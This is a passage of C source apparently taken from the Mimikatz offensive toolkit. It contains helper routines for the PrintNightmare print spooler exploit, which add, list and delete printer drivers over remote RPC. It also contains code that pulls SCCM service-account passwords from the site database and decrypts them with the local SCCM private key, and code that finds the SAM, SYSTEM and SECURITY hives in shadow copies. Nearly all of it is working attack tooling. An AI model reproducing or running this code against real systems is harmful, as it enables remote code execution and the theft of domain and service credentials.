					ret = RpcGetPrinterDriverDirectory(NULL, pInfo2->pEnvironment, 1, (unsigned char *) szDynamicPrinterDriverDirectory, sizeof(szDynamicPrinterDriverDirectory), &cbNeeded);
				}

				if(ret == ERROR_SUCCESS)
				{
					kprintf(L"%s\n", szDynamicPrinterDriverDirectory);
					kull_m_string_copy(&szPrinterDriverDirectory, szDynamicPrinterDriverDirectory);
				}
				else PRINT_ERROR(L"Rpc%sGetPrinterDriverDirectory: %u\n", bIsPar ? L"Async" : L"", ret);
			}
			RpcExcept(RPC_EXCEPTION)
				PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
			RpcEndExcept
		}

		if(szPrinterDriverDirectory)
		{
			if(kull_m_string_sprintf(&pInfo2->pDriverPath, L"%s\\3\\%s", szPrinterDriverDirectory, L"mxdwdrv.dll"))
			{
				if(kull_m_string_sprintf(&pInfo2->pDataFile, L"%s\\3\\%s", szPrinterDriverDirectory, L"mxdwdrv.dll"))
				{
					status = TRUE;
				}
				else
				{
					LocalFree(pInfo2->pDriverPath);
				}
			}

			LocalFree(szPrinterDriverDirectory);
		}
	}
	return status;
}

void kuhl_m_misc_printnightmare_ListPrintersAndMaybeDelete(BOOL bIsPar, handle_t hRemoteBinding, LPCWSTR szEnvironment, BOOL bIsDelete)
{
	DWORD i, cReturned = 0;
	_PDRIVER_INFO_2 pDriverInfo;
	PWSTR pName, pConfig;

	if(kuhl_m_misc_printnightmare_EnumPrinters(bIsPar, hRemoteBinding, szEnvironment, &pDriverInfo, &cReturned))
	{
		for(i = 0; i < cReturned; i++)
		{
			pName = (PWSTR) (pDriverInfo[i].NameOffset ? (PBYTE) &pDriverInfo[i] + pDriverInfo[i].NameOffset : NULL);
			pConfig = (PWSTR) (pDriverInfo[i].ConfigFileOffset ? (PBYTE) &pDriverInfo[i] + pDriverInfo[i].ConfigFileOffset : NULL);
			if(pName && pConfig)
			{
				kprintf(L"| %s - %s\n", pName, pConfig);
				if(bIsDelete)
				{
					if(pName == wcsstr(pName, MIMIKATZ L"-"))
					{
						kuhl_m_misc_printnightmare_DeletePrinterDriver(bIsPar, hRemoteBinding, szEnvironment, pName);
					}
				}
			}
		}
		LocalFree(pDriverInfo);
	}
}

BOOL kuhl_m_misc_printnightmare_AddPrinterDriver(BOOL bIsPar, handle_t hRemoteBinding, PDRIVER_INFO_2 pInfo2, DWORD dwFlags)
{
	BOOL status = FALSE;
	DWORD ret;
	DRIVER_CONTAINER container_info;

	container_info.Level = 2;
	container_info.DriverInfo.Level2 = pInfo2;

	RpcTryExcept
	{
		kprintf(L"| %s / %s - 0x%08x - %s\n", pInfo2->pName, pInfo2->pEnvironment, dwFlags, pInfo2->pConfigFile);
		if(bIsPar)
		{		
			kprintf(L"> RpcAsyncAddPrinterDriver: ");
			ret = RpcAsyncAddPrinterDriver(hRemoteBinding, NULL, &container_info, dwFlags);
		}
		else
		{
			kprintf(L"> RpcAddPrinterDriverEx: ");
			ret = RpcAddPrinterDriverEx(NULL, &container_info, dwFlags);
		}

		if (ret == ERROR_SUCCESS)
		{
			status = TRUE;
			kprintf(L"OK!\n");
		}
		else PRINT_ERROR(L"%u\n", ret);
	}
	RpcExcept(RPC_EXCEPTION)
		PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
	RpcEndExcept

	return status;
}

BOOL kuhl_m_misc_printnightmare_DeletePrinterDriver(BOOL bIsPar, handle_t hRemoteBinding, LPCWSTR szEnvironment, LPCWSTR pName)
{
	BOOL status = FALSE;
	DWORD ret;

	RpcTryExcept
	{
		if(bIsPar)
		{
			kprintf(L"> RpcAsyncDeletePrinterDriverEx: ");
			ret = RpcAsyncDeletePrinterDriverEx(hRemoteBinding, NULL, (wchar_t *) szEnvironment, (wchar_t *) pName, DPD_DELETE_UNUSED_FILES, 0);
		}
		else
		{
			kprintf(L"> RpcDeletePrinterDriverEx: ");
			ret = RpcDeletePrinterDriverEx(NULL, (wchar_t *) szEnvironment, (wchar_t *)pName, DPD_DELETE_UNUSED_FILES, 0);
		}

		if (ret == ERROR_SUCCESS)
		{
			status = TRUE;
			kprintf(L"OK!\n");
		}
		else PRINT_ERROR(L"%u\n", ret);
	}
	RpcExcept(RPC_EXCEPTION)
		PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
	RpcEndExcept

	return status;
}

BOOL kuhl_m_misc_printnightmare_EnumPrinters(BOOL bIsPar, handle_t hRemoteBinding, LPCWSTR szEnvironment, _PDRIVER_INFO_2 *ppDriverInfo, DWORD *pcReturned)
{
	BOOL status = FALSE;
	DWORD ret, cbNeeded = 0;

	RpcTryExcept
	{
		if(bIsPar)
		{
			ret = RpcAsyncEnumPrinterDrivers(hRemoteBinding, NULL, (wchar_t *) szEnvironment, 2, NULL, 0, &cbNeeded, pcReturned);
		}
		else
		{
			ret = RpcEnumPrinterDrivers(NULL, (wchar_t *) szEnvironment, 2, NULL, 0, &cbNeeded, pcReturned);
		}
		
		if(ret == ERROR_INSUFFICIENT_BUFFER)
		{
			*ppDriverInfo = (_PDRIVER_INFO_2) LocalAlloc(LPTR, cbNeeded);
			if(*ppDriverInfo)
			{
				if(bIsPar)
				{
					ret = RpcAsyncEnumPrinterDrivers(hRemoteBinding, NULL, (wchar_t *) szEnvironment, 2, (BYTE *) *ppDriverInfo, cbNeeded, &cbNeeded, pcReturned);
				}
				else
				{
					ret = RpcEnumPrinterDrivers(NULL, (wchar_t *) szEnvironment, 2, (BYTE *) *ppDriverInfo, cbNeeded, &cbNeeded, pcReturned);
				}
				
				if(ret == ERROR_SUCCESS)
				{
					status = TRUE;
				}
				else
				{
					PRINT_ERROR(L"Rpc%sEnumPrinterDrivers(data): %u\n", bIsPar ? L"Async" : L"", ret);
					LocalFree(*ppDriverInfo);
				}
			}
		}
		else PRINT_ERROR(L"Rpc%sEnumPrinterDrivers(init): %u\n", bIsPar ? L"Async" : L"", ret);
	}
	RpcExcept(RPC_EXCEPTION)
		PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
	RpcEndExcept

	return status;
}

typedef struct _SCCM_ENCRYPTED_HEADER {
	DWORD cbKey;
	DWORD cbDecrypted;
	BYTE data[ANYSIZE_ARRAY];
} SCCM_ENCRYPTED_HEADER, *PSCCM_ENCRYPTED_HEADER;

const wchar_t SCCM_QUERY[] = L"SELECT SiteNumber, UserName, Password, Availability FROM SC_UserAccount";
NTSTATUS kuhl_m_misc_sccm_accounts(int argc, wchar_t * argv[])
{
	LPCWCHAR szConnectionString, szPrivateKeyContainer;

	SQLHANDLE hEnv, hCon, hSmt;
	SQLRETURN ret;
	unsigned long int SiteNumber;
	char UserName[60], Password[2048];
	BYTE Availability;
	SQLLEN szUserName, szPassword;

	PSCCM_ENCRYPTED_HEADER pEncrypted;
	HCRYPTPROV hProv;
	HCRYPTKEY hKey;
	ALG_ID algid;
	DWORD cbEncrypted, dwKeySetFlags, cbBuffer;

	kull_m_string_args_byName(argc, argv, L"keycontainer", &szPrivateKeyContainer, L"Microsoft Systems Management Server");
	dwKeySetFlags = kull_m_string_args_byName(argc, argv, L"keyuser", NULL, NULL) ? 0 : CRYPT_MACHINE_KEYSET;

	kprintf(L"[CRYPTO] Private Key Container: %s (%s)\n", szPrivateKeyContainer, (dwKeySetFlags == CRYPT_MACHINE_KEYSET) ? L"machine" : L"user");

	if(kull_m_string_args_byName(argc, argv, L"connectionstring", &szConnectionString, NULL))
	{
		kprintf(L"[ SQL  ] ConnectionString: %s\n", szConnectionString);

		SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &hEnv);
		SQLSetEnvAttr(hEnv, SQL_ATTR_ODBC_VERSION, (SQLPOINTER)SQL_OV_ODBC3, 0);
		SQLAllocHandle(SQL_HANDLE_DBC, hEnv, &hCon);

		ret = SQLDriverConnect(hCon, NULL, (SQLWCHAR*) szConnectionString, SQL_NTS, NULL, 0, NULL, SQL_DRIVER_NOPROMPT);
		switch (ret)
		{
		case SQL_SUCCESS:
		case SQL_SUCCESS_WITH_INFO:
			SQLAllocHandle(SQL_HANDLE_STMT, hCon, &hSmt);

			kprintf(L"[ SQL  ] Query to accounts: %s\n", SCCM_QUERY);
			ret = SQLExecDirect(hSmt, (SQLWCHAR *) SCCM_QUERY, SQL_NTS);
			if (ret == SQL_SUCCESS)
			{
				/* To avoid a lots of them */
				kprintf(L"[CRYPTO] Acquiring local SCCM RSA Private Key\n");
				if (CryptAcquireContext(&hProv, szPrivateKeyContainer, NULL, PROV_RSA_AES, dwKeySetFlags | CRYPT_SILENT))
				{
					/**/
					kprintf(L"\n");
					while (SQLFetch(hSmt) == SQL_SUCCESS)
					{
						ret = SQLGetData(hSmt, 1, SQL_C_ULONG, &SiteNumber, sizeof(SiteNumber), NULL);
						if (ret == SQL_SUCCESS)
						{
							ret = SQLGetData(hSmt, 2, SQL_C_CHAR, UserName, sizeof(UserName), &szUserName);
							if (ret == SQL_SUCCESS)
							{
								ret = SQLGetData(hSmt, 3, SQL_C_CHAR, Password, sizeof(Password), &szPassword);
								if (ret == SQL_SUCCESS)
								{
									ret = SQLGetData(hSmt, 4, SQL_C_TINYINT, &Availability, sizeof(Availability), NULL);
									if (ret == SQL_SUCCESS)
									{
										kprintf(L"[%u-%hhu] %.*S - ", SiteNumber, Availability, szUserName, UserName);
										if (kull_m_crypto_StringToBinaryA(Password, (DWORD)szPassword, CRYPT_STRING_HEX, (PBYTE*)&pEncrypted, &cbEncrypted))
										{
											if (!Availability)
											{
												if (CryptImportKey(hProv, pEncrypted->data, pEncrypted->cbKey, 0, 0, &hKey))
												{
													cbBuffer = sizeof(ALG_ID);
													if (CryptGetKeyParam(hKey, KP_ALGID, (BYTE*)&algid, &cbBuffer, 0))
													{
														kprintf(L"[%s] ", kull_m_crypto_algid_to_name(algid));
													}

													cbBuffer = cbEncrypted - FIELD_OFFSET(SCCM_ENCRYPTED_HEADER, data) - pEncrypted->cbKey;
													if (CryptDecrypt(hKey, 0, TRUE, 0, pEncrypted->data + pEncrypted->cbKey, &cbBuffer))
													{
														if (cbBuffer == pEncrypted->cbDecrypted)
														{
															kprintf(L"%.*S\n", cbBuffer, pEncrypted->data + pEncrypted->cbKey);
														}
														else PRINT_ERROR(L"cbBuffer != cbDecrypted");
													}
													else PRINT_ERROR_AUTO(L"CryptDecrypt");

													CryptDestroyKey(hKey);
												}
												else PRINT_ERROR_AUTO(L"CryptImportKey");
											}
											else kprintf(L"{todo if needed} \n"); // SELECT Name, Value1, Value2 FROM SC_SiteDefinition_Property WHERE Name LIKE 'GlobalAccount:%' (AES256 decrypt)

											LocalFree(pEncrypted);
										}
									}
									else PRINT_ERROR(L"SQLGetData(Availability): %u (0x%08x)\n", ret, ret);
								}
								else PRINT_ERROR(L"SQLGetData(Password): %u (0x%08x)\n", ret, ret);
							}
							else PRINT_ERROR(L"SQLGetData(UserName): %u (0x%08x)\n", ret, ret);
						}
						else PRINT_ERROR(L"SQLGetData(SiteNumber): %u (0x%08x)\n", ret, ret);
					}
					kprintf(L"\n");
					/**/
					kprintf(L"[CRYPTO] Releasing local SCCM RSA Private Key\n");
					CryptReleaseContext(hProv, 0);
				}
				else PRINT_ERROR_AUTO(L"CryptAcquireContext");
				/* No more crypto */
			}
			else PRINT_ERROR(L"SQLExecDirect: %u (0x%08x)\n", ret, ret);
			SQLFreeHandle(SQL_HANDLE_STMT, hSmt);

			break;

		default:
			PRINT_ERROR(L"SQLDriverConnect: %u (0x%08x)\n", ret, ret);
		}

		SQLDisconnect(hCon);
		SQLFreeHandle(SQL_HANDLE_DBC, hCon);
		SQLFreeHandle(SQL_HANDLE_ENV, hEnv);
	}
	else PRINT_ERROR(L"/connectionstring is needed, example: /connectionstring:\"DRIVER={SQL Server};Trusted=true;DATABASE=CM_PRD;SERVER=myserver.fqdn\\instancename;\"\n");

	return STATUS_SUCCESS;
}

DECLARE_CONST_UNICODE_STRING(usRootDevice, L"\\Device");
DECLARE_CONST_UNICODE_STRING(usDevice, L"Device");
const OBJECT_ATTRIBUTES oaDevice = RTL_CONSTANT_OBJECT_ATTRIBUTES(&usRootDevice, 0);
const wchar_t *INT_FILES[] = {L"SYSTEM", L"SAM", L"SECURITY", L"SOFTWARE"};
NTSTATUS kuhl_m_misc_shadowcopies(int argc, wchar_t * argv[])
{
	NTSTATUS status;
	HANDLE hDeviceDirectory;
    BYTE Buffer[0x100];
    ULONG Start, Context, ReturnLength, i, j;
    BOOLEAN RestartScan;
	POBJECT_DIRECTORY_INFORMATION pDirectoryInformation;
	PWSTR szName, szShadowName, szFullPath;
	WIN32_FILE_ATTRIBUTE_DATA Attribute;

	status = NtOpenDirectoryObject(&hDeviceDirectory, DIRECTORY_QUERY | DIRECTORY_TRAVERSE, (POBJECT_ATTRIBUTES) &oaDevice);
	if(NT_SUCCESS(status))
	{
		for(Start = 0, Context = 0, RestartScan = TRUE, status = STATUS_MORE_ENTRIES; status == STATUS_MORE_ENTRIES; )
		{
			status = NtQueryDirectoryObject(hDeviceDirectory, Buffer, sizeof(Buffer), FALSE, RestartScan, &Context, &ReturnLength);
			if(NT_SUCCESS(status))
			{
				pDirectoryInformation = (POBJECT_DIRECTORY_INFORMATION) Buffer;
				for(i = 0; i < (Context - Start); i++)
				{
					if(RtlEqualUnicodeString(&usDevice, &pDirectoryInformation[i].TypeName, TRUE))
					{
						szName = kull_m_string_unicode_to_string(&pDirectoryInformation[i].Name);
						if(szName)
						{
							if(szName == wcsstr(szName, L"HarddiskVolumeShadowCopy"))
							{
								if(kull_m_string_sprintf(&szShadowName, L"\\\\?\\GLOBALROOT\\Device\\%s\\", szName))
								{
									kprintf(L"\nShadowCopy Volume : %s\n", szName);
									kprintf(L"| Path            : %s\n", szShadowName);

									if(GetFileAttributesEx(szShadowName, GetFileExInfoStandard, &Attribute))
									{
										kprintf(L"| Volume LastWrite: ");
										kull_m_string_displayLocalFileTime(&Attribute.ftLastWriteTime);
										kprintf(L"\n");
									}
									else PRINT_ERROR_AUTO(L"GetFileAttributesEx");
									kprintf(L"\n");
									for(j = 0; j < ARRAYSIZE(INT_FILES); j++)
									{
										if(kull_m_string_sprintf(&szFullPath, L"%sWindows\\System32\\config\\%s", szShadowName, INT_FILES[j]))
										{
											kprintf(L"* %s\n", szFullPath);

											if(GetFileAttributesEx(szFullPath, GetFileExInfoStandard, &Attribute))
											{
												kprintf(L"  | LastWrite   : ");
												kull_m_string_displayLocalFileTime(&Attribute.ftLastWriteTime);
												kprintf(L"\n");
											}
											else PRINT_ERROR_AUTO(L"GetFileAttributesEx");

											LocalFree(szFullPath);
										}
									}
									LocalFree(szShadowName);
								}
							}
							LocalFree(szName);
						}
					}
				}
				Start = Context;
				RestartScan = FALSE;
			}
			else PRINT_ERROR(L"NtQueryDirectoryObject: 0x%08x\n", status);
		}
		CloseHandle(hDeviceDirectory);
	}
	else PRINT_ERROR(L"NtOpenDirectoryObject: 0x%08x\n", status);

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_misc_djoin_proxy(int argc, wchar_t * argv[])
{
	kuhl_m_misc_djoin(argc, argv);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_misc_citrix_proxy(int argc, wchar_t * argv[])
{
	kuhl_m_misc_citrix_logonpasswords(argc, argv);
	return STATUS_SUCCESS;
}